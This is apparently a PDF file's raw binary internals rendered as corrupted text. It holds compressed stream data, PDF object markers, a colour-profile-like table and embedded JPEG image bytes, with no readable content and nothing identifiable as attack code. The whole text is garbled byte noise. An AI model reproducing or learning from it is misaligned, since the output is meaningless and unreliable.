¬ø¬πT¬∞(‚Äì√ÑÔøΩ‚Ä∞≈†HÔøΩ√Ço√í;~1‚Ñ¢≈í√≥¬¶XÔøΩS√°n√Æ{√ÇÀÜ‚Äû¬ß¬ß|t‚Äò¬±√Ø√π¬∫)√∏√∏‚Äô_√ï¬ªM¬æ√¶‚Äú√û	√æ√π√öh&gt;__¬≤‚Ç¨g#√ñ√Æ
≈æ]√¶√ç0¬≠
&gt;{√ö√º√º¬±√ΩÔøΩ¬µy[√∞yN~√µ¬∂√≥;;√É√∏√ç¬º¬®Z)√∏$√ü~,√ä√•¬™eq√≤√∑E¬ß:‚Ä∞D√Ç¬ß√´|√ô¬∞H√≤i]¬µ√£q√Ωxw¬¢bM:
S‚Ç¨{√íN√≥M¬π~z3+7E√É¬Æ≈†≈∏√¨¬¶√û√§√ï[√í]√•√à
5&nbsp; √πuv9#U√ñ√Æ≈†v¬æ¬≤5¬¢√®¬∂KF
√Å/√ö|]√éG√ïr]0√Å¬≥¬∂√ò|aZt¬¢)&amp;¬ª+¬∑m¬Ω√£_M
Rj¬™‚Ä∫≈†&amp;G√Æ=¬Ø√¶√µ¬¢¬¨‚Äì√º¬∂¬¨FUS¬∫√Øi¬πk√ö√â*√ü√Åe‚Ä°√°√ç≈ìa:√ºSnlB¬•x√∂√∞¬≠√Ödf0√ä√ä¬•√Å√≠¬™¬πK√ç√æ%‚Ä¶
‚Äì2≈†&nbsp;ÔøΩ≈°)!ÀÜ4|¬£.√êÔøΩ‚Ä∞t¬∞¬¶√ñ√è0√ô√ª¬ºDhK√∂√É‚Äô‚Äù‚Äô¬•√∞Z‚Äô0‚Äû√ùJÀÜÀÜ¬¶TL&lt;√•√≠¬µ:mx$k‚Ä°¬æ√à¬£√û√™RÀÜoy‚ÄùS√ûÔøΩ√ï¬ß‚Äù√±`‚Ä°¬º¬∫≈°√Ω√ú
≈∏¬©√õ√¶√®√∑‚Äû√≤3&lt;√Ü‚Äù√ê√èy8‚Ä¢‚Äû|‚Äù√±5=¬µvÔøΩ√®√ÆP~`√µ√®A¬©¬Ω¬∑¬≠‚Äû¬≤7‚Äò√â)≈Ωq¬¥√òR√ï]‚Ä¶|√®]02/∆í$√Ü√íc¬∑VF)¬£LBl¬¥5√∂
l¬•≈†\b$L[√î≈æ¬§7¬¢&gt;a¬°¬¥P¬®O.¬¶¬°!j&lt;√™Fs‚Äû√∞√Æcr¬ª√æZ‚ÄôL_z√∑‚Ä°ÀÜ¬´√¢A√Ñ
√µQ√ÑU≈°t8/A^‚Ä°¬∏'√£z¬Ωxv‚Äú√ò
¬¢√∏y√úU√â¬≥¬∏ko%√∏√Ç√™¬æJ)¬∑√¥d¬µ‚Ä°T√Æi&amp;√¢√ï√®√´√¢$bO O#√°√ê√ì!¬•yr6I‚Äû
z¬∂√Ä¬£√é¬°*~[;√≥≈ì√º8TÀÜ√î‚Ä°_¬•‚ÄîÀú2√†F√∞kN_√Æ|¬Ø
o√µ√é√á√†‚Ä∫√ï√µ√°7J√°√≠‚Ä†‚ÄöN≈†¬£√∞√´&amp;0¬ø¬§"√æbI=√ºu^}√º√≠Àú¬ø√†√ê`‚Ñ¢ÀÜ√öM¬∞¬≤√ßXIq√Ä√ë√Ø¬¨¬º!√µ√âM√ê√æ9[¬¢B<rngv‚Äú¬µ+√í'√ªg?¬¥¬∂h√≥√á<√á"¬∞√ôg{@√†_ ÔøΩ√ön¬®s="" endstream="" endobj="" 13481="" 0="" obj="" <<="" filter="" flatedecode="" length="" 943="">&gt;stream
H‚Ä∞≈íVms√õ6√æ¬Æ_ÔøΩÔøΩ√î¬Æ¬¢√∏&amp;R¬∫√´√µ.~√ã¬º¬´√ì¬§‚Äì√õ√õ√π√∫√Åu√¨√Ñ¬ª√ô√äu[√æ√Ω@R‚Äô√•√îR√¶H‚Äö√Ä&lt;¬§A√ÑW√ár¬∑]¬≠Kx√ø&gt;¬æ*√ã√ï√∫qs√ã8/≈æ√†[&lt;√ø√ÇR2
Fq*≈í√â20‚Ä∞¬°J√°√±√º√á√∑√≤√•i√±¬Ø‚Ä∫√ï√Ω√¶q√ÆV¬∑¬´‚Ä°√ùaU√Æ≈†|√∏0
!ÀÜ‚Ä°s√´g`√è√´C√ß9√π6√†"‚Ä†√õ√∏√¥^√ç4√§√ª‚Ç¨@Àú√ø≈ígxy√úÔøΩrP‚Äùe¬±o‚Ç¨F‚Ä¶√äHE
SÔøΩ(
:¬°√ín¬µ√ÄN≈†¬¢√¨;√à√õ¬∞√Ö 4i¬°¬™¬∞√•√∫K@+¬™(√É)cU)7√Å√ñ≈°√Å8¬πÔøΩ3bx* _C%√º-Bs*A¬¶T+√´eI7√É0J√à√á¬´yi‚Äö≈ìL√ÉH‚ÄôI#ÔøΩG√°¬∑√º¬∑‚Ç¨9‚Äú√ñ≈ì¬•$¬±√¢√Ω	≈∏K≈∏√Öqk√≥6NG¬®p¬¢‚Äû[JrM√èh‚ÄìV&nbsp;≈ì√®b7‚Äöf√™%-∆í¬º∆íc^[J¬≥I√Ç(√Ø1#j3"≈Ω9‚ÄùÔøΩÔøΩ:Te¬≠i≈°2c√µyb√£^‚Äô√¶‚Ä°brnCN¬Æ¬º√º√ô&gt;√âg!¬£≈°≈ío¬™%|
√≠√©¬°¬æe^A√ö≈ì3j√à√òe√π2√ï@v√å#Q%!¬πX‚Ç¨√ÜG√¢‚Äò
?:≈∏BÔøΩ√û#pvq√õnH2√ÉCCnCA¬π√ì‚Ä∫√û\¬ª‚Ç¨W4_‚Ä†‚Äô√¥@‚Ä∞$‚Äö0MV-Àú√π8¬¥I.&gt;‚Ä°√®*w‚Äπ√ü√Å.√Ü√é√ªÔøΩ√≥¬ΩÀú√ñ;√ä√î‚Ä¢|√£!√é√°√ö3√π√Ω√øU√óPS≈°≈ì√Å¬∫¬¨n≈°√≤jfF√æK‚Ä°n√ö√í¬≠√ªN√°√î:√æ‚Äπ'x√£√™√°Z‚Äì≈∏m[√≠\T√Ö√Å¬Ø	√∞wP‚Ä¢√é√Ü√©√º√ñ¬∑Y¬π^√∂Q√ô¬Ø`e?‚Ä°√ê√™}∆í‚ÄúO¬•√ò√æ√ù√Ü√ézC'√ù¬≠√Å√π√è)h5¬¢√Ä&amp;4
√ª√ë{√ì'√åK2√≥‚Äò]Z√ñn√±√®B‚ÄúTKS
‚Äìw~√æ	√Ü√ù√ìx√ù√Ås√±V√¥"=¬±7√ç√û√â:Wo¬´$√Ωi√Å1'¬∏¬¶‚Ñ¢¬æ¬£vÔøΩ√º√ùf¬øx√≤√Ö√°ÔøΩ√Æ¬´J√π√ÆG√Ö‚ÄùÔøΩ^:+≈í√ã‚Ç¨≈°.¬∞≈°√â¬≥=√≥¬ø√µ√Ü√ûr¬ª√Æ¬¶V¬Æ√∂¬∑‚Ä¶√ßmÔøΩ/¬≤V¬£√ñ√ú∆í|q7Ku√ØJT¬¨¬¶√§∆í√∑V√ø√ö-^z#h3jfN3r4‚Ä¢√ôYH‚Äú√Çz&lt;^K√¢√≥V¬ß¬µ√ók√ì√¢8√ï¬§2√ùy¬´Àú¬™√™¬π√ú≈∏√ÖWB¬±‚Ä¶√û4‚Äπ¬¶√ó{√°d¬ß¬π¬´‚Ä¶y√£√£‚Ä†N√ì√ü6‚Äú√ù√ÉÔøΩ√£√¶√¥&amp;l√ö√Ω¬Ø√Ä√òa&nbsp;¬¥¬°6n√Ñ‚Ä¢¬°√ú~^|‚Ä¶√á√ó√∏√ä}x√º¬π√å8~≈ì9‚Ä°¬®√Ü2√ºa‚Ä†√ê‚Äû{‚Ä¶3√º%√ñ√ª ≈æ√Æ≈í≈†√†√éC¬∏√æ`√û√º0√Ñ
endstream
endobj
13482 0 obj
&lt;&gt;stream
H‚Ä∞b``≈ì√°√®√¢√§√ä$√Ä√ÄÔøΩ‚Ä∫WR√§√§¬•√Ä~≈æÔøΩÔøΩÔøΩ‚Ñ¢‚Äú‚Äπ|@√¨¬º√º¬ºT√∞√≠#ÀÜ¬æ¬¨2S/`M.(*√í‚Ç¨√ò(%¬µ8H√¢√å√≤‚Äô&nbsp;8cÔøΩ-‚Äô‚Äù
f∆í√î‚Ä∞d‚Ä°9√ô@6_IjH≈í√Å9¬ø&nbsp;¬≤(3=¬£D√Å√ê√í√íR√Å1%?)U!¬∏¬≤¬∏$5¬∑X√Å3/9¬ø¬® ¬ø(¬±$5¬®j√∞¬ª%V*¬∏'√¶√¶&amp;*√©‚Äò√®r"(,!¬¨√è!√†0b;ÔøΩC‚Ç¨√§√í¬¢2(‚Äú‚Äò√âÀúÔøΩ √ÄI√Ü8/
endstream
endobj
13483 0 obj
&lt;&gt;stream
H‚Ä∞≈ì‚ÄìyTSw√áo√â≈æÔøΩ‚Ä¢¬∞√Éc
[‚Ç¨¬∞ÔøΩ5la‚ÄòQIBH√òADED‚Äû¬™‚Ä¢2√ñmtFOEÔøΩ.¬Æc¬≠√ñ}√™√í√µ0√™√®8¬¥√ó≈ΩÔøΩ8GÔøΩNg¬¶√ì√Ø√Ø√∑9√∑w√Ø√Ø√ù√ü¬Ω√∑ÔøΩ√≥&nbsp;'¬•¬™¬µ√ï0ÔøΩ√ñ&nbsp;√èJ≈í√Öb¬§	
 2y¬≠.-;!√†‚Äô√ÜK¬∞Z√ú	√º‚Äπ≈æ^ÔøΩi¬Ω"L√ä√Ä0√∞√ø‚Ä∞-√ó√©
@8(‚Äù¬µr≈ì;q¬Æ¬™7√®L√∂≈ìy¬•‚Ä¢&amp;‚Ä†Q√´√±q¬∂4¬±j≈æ¬Ω√ß|√¶9√ö√Ñ
ÔøΩVÔøΩ¬≥)gÔøΩB¬£0√±i≈ìW√ó‚Ä¢8#¬©8w√ï¬©‚Ä¢√µ8_√Ö√ô¬•√ä¬®Q√£√º√ú¬´Q√äj@√©&amp;¬ªA)/√á√ôg¬∫&gt;'K‚Äö√≥√àt√ï;\√∫‚Äù
√ì¬•$√ï¬∫F¬ΩZUn√Ä√ú√•Àú(4T≈í%)√´¬´‚Äù∆í0C&amp;¬Ø‚Äù√©Àú¬§Z¬£‚ÄúiÀú¬ø√≥≈ì8¬¶√öbx‚Äò∆íE¬°√Å√ÅB√ë;‚Ä¶√∫¬Ø‚Ä∫¬øP¬¶√û√é√ì‚Äú√å¬π≈æA√ºom?√ßW=
‚Ç¨x¬Ø√ç√∫¬∑¬∂√í-≈í¬Ø√Ä√≤√¶[‚Ä∫√ã√ª0√±¬æ¬æ√∏√é}√∏¬¶y)7ta¬æ¬æ√µ√µ√µ&gt;j¬•√ú√áT√ê7√∫≈∏¬ø@√Ø¬º√è√át√ú‚Ä∫√≤`q√ä2‚Ñ¢¬±√ä‚Ç¨‚Ñ¢√™&amp;¬Ø¬Æ¬™6√™¬±ZÔøΩL¬Æ√Ñ‚Äû?√¢_√∏√≥yxg)√ã‚Äùz¬•ÔøΩ√à√É¬ßL¬≠U√°√≠√ñ*√îu¬µSk√øSe√òO4?√ó¬∏¬∏c¬Ø¬Ø√ò¬∞.√≤√≤¬∑√•√íR¬¥
√üÔøΩ√û√¥-‚Ä¢‚Äô2√∞5√ü√°√û√º√ú√è	√∫√∑S√°&gt;√ì¬£V¬≠≈°‚Äπ‚Äúd√•`r¬£¬æn~√è√¥Y&nbsp;&amp;√†+`≈ìÔøΩ;√ÇA4ÀÜ√â √§‚Ç¨¬∞√àA9√ê=¬®-&nbsp;tÔøΩ¬∞l√É`;¬ª√Å~p≈í∆íÔøΩ√Å	√∞Gp|	¬ÆÔøΩ[`L∆í‚Ä°`&lt;¬Ø "AÀÜYAÔøΩ+√§√πCb(≈†‚Ä°R¬°,¬®*ÔøΩTÔøΩ2B-√ê
¬®√™‚Ä°‚Ä†¬°√ên√®√∑√êQ√®t¬∫}MA&nbsp;√Ø&nbsp;‚Äî0√ìal¬ª√Å¬æ¬∞≈ΩÔøΩS√†x	¬¨‚Äök√†&amp;¬∏^√Å¬£√∞&gt;√∏0|&gt;_∆í'√°‚Ä°√∞,√ÇG!"F$H:RÀÜ‚Äù!z¬§√©F‚ÄòQd?r9‚Äπ\A&amp;‚ÄòG√à‚ÄùÀÜrQ¬¢√°h≈°‚Äπ√ä√ë¬¥√≠E‚Ä°√ë]√®a√¥4zÔøΩBg√ê√ó√Å‚Äì√†E#H	‚Äπ*B=¬°‚Äπ0H√òI√∏ÀÜp‚Ä†pÔøΩ0MxJ$√πD1‚ÄûÀúD, V‚Ä∫‚Ä∞¬Ω√Ñ¬≠√Ñ√Ñ√£√ÑK√Ñ¬ª√ÑY‚Ä∞dE√≤"EÔøΩ√íI2‚ÄôÔøΩ√îE√öB√öG√∫≈ít‚Ñ¢4MzN¬¶‚Äò√à√æ√§r!YK√Æ ‚Äô√∑ÔøΩ?%_&amp;√ü#¬ø¬¢¬∞(¬Æ‚Äù0J:EAi¬§√¥Q√Ü(√á()√ì‚ÄùWT6U@ÔøΩ&nbsp;√¶P+¬®√≠√î!√™~√™√™m√™ÔøΩ√¶D¬•e√í√î¬¥√•¬¥!√ö√Øh≈∏√ì¬¶h/√®¬∫']B/¬¢√©√´√®√íÔøΩ√ì¬ø¬¢?a0n≈íhF!√É√ÄX√á√ò√ç8√Ö√∏≈°√±√ú≈ík√¶c&amp;5SÀú¬µ‚Ñ¢ÔøΩÀú6¬ªl√∂ÀúIa¬∫2cÀúK‚Ñ¢M√åA√¶!√¶E√¶#‚Ä¶√•√Ü‚Äô¬∞d¬¨V√ñ√´(√´k‚Äì√çe‚Äπ√ò√©l
¬ª‚Äî¬Ω‚Ä°}≈Ω}≈∏C√¢¬∏q√¢9
N'√ß√é)√é].√Çu√¶J¬∏r√Æ
√Æ√∑w≈°G√§	xR^¬Ø‚Ä°√∑[√ûo√Ü≈ìch≈æg√û`&gt;b√æ‚Ä∞√π$√°¬ª√±¬•√º*~√ø √ø:√ø¬•‚Ä¶ÔøΩE≈í‚Ä¶√íbÔøΩ√Ö~‚Äπ√ã√è,m,¬£-‚Ä¢‚Äì√ù‚Äì,¬ØY¬æ¬¥√Ç¬¨√¢¬≠*¬≠6XÔøΩ[√ù¬±F¬≠=¬≠3¬≠√´¬≠¬∑Y≈∏¬±~d√É¬≥	¬∑‚Äò√õt√õ¬¥¬πi√õz√öf√ô6√õ~`{√Åv√ñ√é√û.√ëNg¬∑√Ö√Æ‚Äù√ù#{¬æ}¬¥}‚Ä¶√Ω‚Ç¨√Ω¬ß√∂¬∏‚Äòj‚Ä°‚Ä°√è√æ≈†‚Ñ¢c1X6‚ÄûÔøΩ√Üfm‚ÄúÔøΩ≈Ω;'_9	≈ìrÔøΩ:≈ì8√ùq¬¶:‚ÄπÔøΩ√ã≈ì≈ìO:√è¬∏8¬∏¬§¬π¬¥¬∏√¨u¬π√©Jq¬ª‚Äì¬ªnv=√´√∫√åM√†‚Äì√Ø¬∂√äm√ú√≠¬æ√ÄR 4	√∂
n¬ª3√ú¬£√úk√úG√ù¬Øz=√Ñ‚Ä¢[=¬æ√¥‚Äû=∆í&lt;√ã=GTB(√â/√ôS√≤∆í,]6*‚Ä∫-‚Ä¢‚Äì¬æW:#‚Äî√à7√ã*¬¢≈†√äe¬ø√≤^YDY√ô}U‚Äûj¬£√™AyT√π`√π#¬µD=¬¨√æ¬∂"¬©b{√Ö¬≥√ä√¥√ä+¬¨√ä¬Ø:&nbsp;!kJ4G¬µm¬•√∂t¬µ}uC√µ%ÔøΩ‚Äî¬ÆK7YV¬≥¬©fF≈∏¬¢√üY√ï.¬©=b√†√°?S≈í√Æ√Ü‚Ä¢√Ü¬©¬∫√à¬∫‚Äò¬∫√ß√µy√µ‚Ä°√ò
√ö‚Ä†ÔøΩ≈æÔøΩk√Ø5%4√Ω¬¶m‚Äì7≈∏lqlio‚Ñ¢Z¬≥lG+√îZ√öz¬≤√ç¬π¬≠¬≥mzy√¢√≤]√≠√î√∂√ä√∂?u√∏u√¥w|¬ø"√Ö¬±N¬ª√é√•ÔøΩwW&amp;¬Æ√ú√õe√ñ¬•√Ø¬∫¬±*|√ï√∂√ï√®j√µ√™‚Ä∞5k¬∂¬¨y√ù¬≠√®√æ¬¢√á¬Øg¬∞√ß‚Ä°^y√ØkEk‚Ä°√ñ√æ¬∏¬Æl√ùD_p√ü¬∂√µ√Ñ√µ√ö√µ√ó7Dm√ò√ï√è√Æo√™¬ø¬ª1m√£√°l&nbsp;{√†√ªM√Ö‚Ä∫√é
n√üL√ùl√ú&lt;9‚Äù√∫O¬§[√æÀú¬∏‚Ñ¢$‚Ñ¢ÔøΩ‚Ñ¢√º≈°h≈°√ï‚Ä∫B‚Ä∫¬Ø≈ì≈ì‚Ä∞≈ì√∑ÔøΩdÔøΩ√í≈æ@≈æ¬Æ≈∏≈∏‚Äπ≈∏√∫&nbsp;i&nbsp;√ò¬°G¬°¬∂¬¢&amp;¬¢‚Äì¬£¬£v¬£√¶¬§V¬§√á¬•8¬•¬©¬¶¬¶‚Äπ¬¶√Ω¬ßn¬ß√†¬®R¬®√Ñ¬©7¬©¬©¬™¬™ÔøΩ¬´¬´u¬´√©¬¨\¬¨√ê¬≠D¬≠¬∏¬Æ-¬Æ¬°¬Ø¬Ø‚Äπ¬∞¬∞u¬∞√™¬±`¬±√ñ¬≤K¬≤√Ç¬≥8¬≥¬Æ¬¥%¬¥≈ì¬µ¬µ≈†¬∂¬∂y¬∂√∞¬∑h¬∑√†¬∏Y¬∏√ë¬πJ¬π√Ç¬∫;¬∫¬µ¬ª.¬ª¬ß¬º!¬º‚Ä∫¬Ω¬ΩÔøΩ¬æ
¬æ‚Äû¬æ√ø¬øz¬ø√µ√Äp√Ä√¨√Åg√Å√£√Ç_√Ç√õ√ÉX√É√î√ÑQ√Ñ√é√ÖK√Ö√à√ÜF√Ü√É√áA√á¬ø√à=√à¬º√â:√â¬π√ä8√ä¬∑√ã6√ã¬∂√å5√å¬µ√ç5√ç¬µ√é6√é¬∂√è7√è¬∏√ê9√ê¬∫√ë&lt;√ë¬æ√í?√í√Å√ìD√ì√Ü√îI√î√ã√ïN√ï√ë√ñU√ñ√ò√ó\√ó√†√òd√ò√®√ôl√ô√±√öv√ö√ª√õ‚Ç¨√ú√ú≈†√ù√ù‚Äì√û√û¬¢√ü)√ü¬Ø√†6√†¬Ω√°D√°√å√¢S√¢√õ√£c√£√´√§s√§√º√•‚Äû√¶
√¶‚Äì√ß√ß¬©√®2√®¬º√©F√©√ê√™[√™√•√´p√´√ª√¨‚Ä†√≠√≠≈ì√Æ(√Æ¬¥√Ø@√Ø√å√∞X√∞√•√±r√±√ø√≤≈í√≥√≥¬ß√¥4√¥√Ç√µP√µ√û√∂m√∂√ª√∑≈†√∏√∏¬®√π8√π√á√∫W√∫√ß√ªw√º√ºÀú√Ω)√Ω¬∫√æK√æ√ú√øm√ø√ø√∑‚Äû√≥√ª
endstream
endobj
13484 0 obj
&lt;&gt;]/Filter[/DCTDecode]/Height 268/Length 67192/Subtype/Image/Type/XObject/Width 854&gt;&gt;stream
√ø√ò√ø√†JFIF``√ø√°ExifMM*√ø√õC		



	
√ø√õC√ø√ÄV"√ø√Ñ	
√ø√Ñ¬µ}!1AQa"q2ÔøΩ‚Äò¬°#B¬±√ÅR√ë√∞$3br‚Äö	
%&amp;'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz∆í‚Äû‚Ä¶‚Ä†‚Ä°ÀÜ‚Ä∞≈†‚Äô‚Äú‚Äù‚Ä¢‚Äì‚ÄîÀú‚Ñ¢≈°¬¢¬£¬§¬•¬¶¬ß¬®¬©¬™¬≤¬≥¬¥¬µ¬∂¬∑¬∏¬π¬∫√Ç√É√Ñ√Ö√Ü√á√à√â√ä√í√ì√î√ï√ñ√ó√ò√ô√ö√°√¢√£√§√•√¶√ß√®√©√™√±√≤√≥√¥√µ√∂√∑√∏√π√∫√ø√Ñ	
√ø√Ñ¬µw!1AQaq"2ÔøΩB‚Äò¬°¬±√Å	#3R√∞br√ë
$4√°%√±&amp;'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz‚Äö∆í‚Äû‚Ä¶‚Ä†‚Ä°ÀÜ‚Ä∞≈†‚Äô‚Äú‚Äù‚Ä¢‚Äì‚ÄîÀú‚Ñ¢≈°¬¢¬£¬§¬•¬¶¬ß¬®¬©¬™¬≤¬≥¬¥¬µ¬∂¬∑¬∏¬π¬∫√Ç√É√Ñ√Ö√Ü√á√à√â√ä√í√ì√î√ï√ñ√ó√ò√ô√ö√¢√£√§√•√¶√ß√®√©√™√≤√≥√¥√µ√∂√∑√∏√π√∫√ø√ö?√Ω√º¬¢≈†(¬¢≈†(¬¢≈†(¬¢≈†‚Ç¨
)¬¢O‚Äî8¬°d√à√®i9%¬∏¬¢ÀúnW'‚Ä¶√â8√Ç√£√ñ¬π¬Ø‚Ä∞_√º)√∞wC}K√Ö√æ‚Äî¬°Y&nbsp;√úd¬º¬∏X¬≤=ÔøΩ9?@3Y√ï¬ØN≈°√¶¬©$‚Ä†‚Äú{ÔøΩ1√Ä9o√Æ√ß≈°G¬∏H√≥ÔøΩ√á''√≤√´_)√ºh√ø‚Äö¬´√∏g√ÄV‚Äô&gt;‚Ä∞¬•^j6√©√æ¬≥T√ï&amp;M'L∆í√´$√ÑH√ø√∂√ç¬æ)√∏√π√ø
√©z≈æ√è√±√É√∂¬∞,¬æO√∂_‚Äû¬¥√Éu≈∏√Ø}¬Æ√≠‚Äì2&gt;‚Äò~√§G9ÔøΩira)√ä¬£√≤F√´√£√ºGc√∂√≠
¬©¬∏¬±√õ≈í√§√¥√á√ñ¬¢¬∏√ï!¬∑M√íH‚Äò¬®√ã~ÔøΩk√π√è√∏√â√ø√Ω¬∫√±y¬πk{/√´r¬©√ôo%√∑≈†¬•¬∞‚ÄöH√é~√¥V¬ª?)√™+√Ç5≈∏√∏,‚Äπ<k‚Ä∞¬•√∏3√°√¥w8 dk&√î&√Å√à√≥b}8≈°√¥√®e¬π√≠t¬•k="" √ä‚Ä∫¬∑¬Ω.¬ß4¬±8x|sg√µ¬´√º{√∞="">‚Ç¨√Ñ_√∏√É√Ç√∂8√ø≈∏ÔøΩV√û/√Ω	√ÖCc√ªE|?√î√üm¬∑ÔøΩ√º#p√ø√ùÔøΩX¬∂s√∫=.s√ÅU√æ2√©e‚Äò¬°√∞√¶≈∏;(r‚Ä°C≈Ω6U'√£ ≈∏L√ïi?√†¬¨¬ø&amp;?5√á‚Ä¶‚Ñ¢?¬∏t+q√∫¬™¬≠zp√°≈Ω(≈°√¶≈Ω/√æ√û9√û?ÔøΩ¬πÔøΩ√™√™√É√Ñv:≈æ
¬µ√≠¬•√Än≈æ\√ä√π√ºÔøΩZi‚Äù¬®!√â¬¶9¬Ø√•7√É≈∏√∞V√è√©√ëJ5√º&gt;√ï‚Äπy¬§‚Äπ √¢%X=√è√´¬ø√†¬ª‚Ä°‚Äû'aq√°≈∏iw1ÔøΩ√ë√ø√Ç5√¢√´¬®¬≠¬±√õ√ΩFx≈Ω}ÔøΩ¬ÆfM√Ñ8√∑≈í%√Ω$oO‚Äû¬®‚ÄúU¬π√Ω..rO√Ø√¥¬•g
:√±_ÀÜ√ü√†√¢√ª
jh√íoÀÜ:√ñ‚Ä¶:(y&nbsp;√±‚Ä†‚Ä°
√µ¬≥‚Äô√õv√π√∂¬¢&amp;≈í√ø√ÄH¬Ø¬∑~√ø√Åb√¥ÔøΩ‚Ä∞p√Å4√ö5¬¶¬ªb√¶5≈∏S√∞‚Ä†¬®¬∫¬¨v[√∫y‚Äì√¨#≈ì√£¬æ√Ño√Ü¬ºyf√í¬£¬Æ2≈í¬©√õ¬∫:S√∏2O√ê√ª‚Äö≈†√≥√ü‚Ä¶≈∏¬µO‚Ç¨¬æ2√ûKi&nbsp;√∏≈Ω√Ç√£R¬∑ M¬ß√ä√æE√¥√∂{w√Ñ¬´√∏¬Æ+¬æ[‚Ä¢t√ú¬§&lt;∆í‚Äò‚Äö+√ì¬£≈í¬£Y^≈ì‚Äú3qkrJ)≈æz√ß√§√∂√Ü)√ÅÔøΩ¬Æ≈ΩdH¬¥QE0
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(√éi	√á¬≠&amp;√í√ú¬¢≈°%√èc√ó√Ü¬ªU√á√èAÔøΩ√≥ÔøΩ√á2≈ìb¬π¬§√¨ÔøΩk¬±-48n‚Äû√µ¬Ø&gt;√∏¬´√ªT√∏√†¬∂√®√ºK√¢}3N¬ª√π¬¢√àI√ß^√à≈∏√û[x√ÉJ√É√ùTÔøΩz√∞?√ÅU√¥√õtX|=√°{¬∑¬ª≈∏√¶¬µ√æ√û¬ΩÔøΩMi√Ω√§ÔøΩ|√âO√ê&nbsp;o√∂k√Ü√Ñ√ß¬∏Z‚ÄìSMÔøΩ√Ç√ï‚Äì√ë&gt;¬∫‚Ä†∆í¬∏7B9‚Äòg¬π
≈∏¬°√ç|√≠√±√≥√£+Mo√°^√Ä√®v=√ñÔøΩ√°√≥√ô¬ø√†z‚Äπ√Ü√æ¬©'√Ω≈∏?i√è√ú¬•√é¬£√¢¬Ωi^U√úx¬•4¬•OcÔøΩ¬π¬≠y√è≈†¬ø‚Ä¶E¬≥G‚Ç¨√•√∏¬•c√Æ√è¬µ¬Æ√ç√õ¬∞=√∏√æt¬øi_√Ø√é¬æ∆í√∂√∏√â¬≠√Ç?¬¥¬ºq¬¢6H√á√ö¬Ø¬µMC¬ØC√æ¬π8¬£√æ¬Ø√±√ão√∏¬´&lt;√¶(√â√Ö‚Ä†&nbsp;O¬¥√ß√¥¬¨¬ø√ñ√Ω¬ø¬∏T¬£√º√®√ª‚Ä¶nU√ó!∆íc≈∏√•J¬∑
S%¬∂ÔøΩs√Ö|9s√ª	√ºj√êPÔøΩ7√áJ√°K¬¢jZ‚Ä¢‚Ç¨√Ä√∑8√Ωj¬•¬Ø√Ä?√ö{√Äs√âwa√¢ÔøΩrIw√è‚Ä∞√£√ñ√æ‚Äò√ù√Ä∆í√µ¬£√Ωd√Ñ√ì√∏√∞√≤_"¬æ¬£M√≠4}√†$√ß√£==M)‚Ä¢Td≈ì~+√†‚Äî√Ω¬≤¬æ;√ºX¬¨¬ºQ√°[‚Äî‚Ä∫¬¥√∫¬ß‚Ä°√ú‚Äπ√ü√ªo¬ß¬ºÔøΩ¬ß√º
1]√ß‚Ç¨¬ø√†¬´≈°-√ö√ºE√°¬ª√ªy!}‚ÄîR√®7q√´)g√Ø$K¬∂√†¬§F¬∫)√±n√ø8zÔøΩ√≤√∫‚Äπ√†√î√∫√∂≈†√°&gt;~√í√æ√∏√ã≈∏
√∏‚ÄîL√î√ßh√º√ìj¬≤ywq¬Ø√ªp&gt;%C√¨√ä¬µv√øh_¬¶9¬Ø¬¢¬£‚Äπ¬£[JrL√•≈ì\~$IE1√ßq∆í≈∏¬•*√â¬πs≈†√ôM2/√êuEC
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
(¬¢‚Ç¨
)¬¶L0j	√µX¬≠‚Ä¢≈°BcE,√É¬Ø√π√á|T:‚ÄòI¬∂√∂√úi7¬∞√ø¬¥)$√ì¬Ø¬∑√°\?√Ü¬Ø√ö?√Å√øtd¬ª√±&gt;¬±‚ÄπO‚Äòmj¬ø¬º¬ª¬Ω#¬™√Ö
√•√ú≈Ω√∏√´_1~√ô√ø√∞V_|√∞√ç√∞√∞√ñ¬±¬§√ôXZ7‚Äú?≈†√µl#√π√•g-{/√ª¬∏ÔøΩ√Ω¬∫√ºM√Ω¬©√ø√†¬Æ&gt;/√∏√ó√¢[ÔøΩ3√°√Ä√±
¬•√Ü¬Ø3√Ñ5√õ¬ø√¥ÔøΩkO √ß√äP√¨√±√∫,"¬º√¨3√Ü√¶U]¬≤:/¬µ√ê%*t5W¬©√∫‚Ä∫√ªq√ø√Åp,~X√â¬∫‚Äû√ä¬π‚ÄπN¬Æ¬£√¢‚Ä∫¬•=√ñc¬Ø√ë√ã7¬µ~X√ºg√ø‚Äö√Ö√∏√è√á≈æ*a√†M3X¬ºÔøΩe√Ü¬≥/√∂√Ü¬ªq!8¬¶@R!≈æ1q√ó+√ª√æ√Çz√≠√ªa'√É¬Ø≈Ω&gt;√ñ&gt;x∆íP√îm√≠√óN‚ÄîM≈°√´V√ñ.'≈í√à‚Äò	y≈†¬∑¬´0,	nk√Æ‚Ä∞?¬≥≈∏√Ño√ò/√æ
%¬§√º√Ω‚Ä∫&lt;√°_
√öM√°Y|M¬ßx¬æ√ª@]W√±√Ä‚Äô;√áqs(+3 A√•*√à≈ì≈í≈ì}n‚Äö√≤√º√ì√å√§√´U√≥√í'‚Ñ¢&lt;√ö¬º√£√ç‚Äû¬¥W‚Ñ¢√∞√á√¨‚Ñ¢√ª|e√ø‚Äö¬±√ºD√î¬¥√ª√©z≈Ω¬°¬ß√ã‚Ä∫√ø√∏I¬µ¬∑YB√≥‚Äú1p0rQ1√çe√æ√í√ø√∞O√è√Å6&gt;:YX√ºn√∞f¬±¬©√∏1√¶√ù
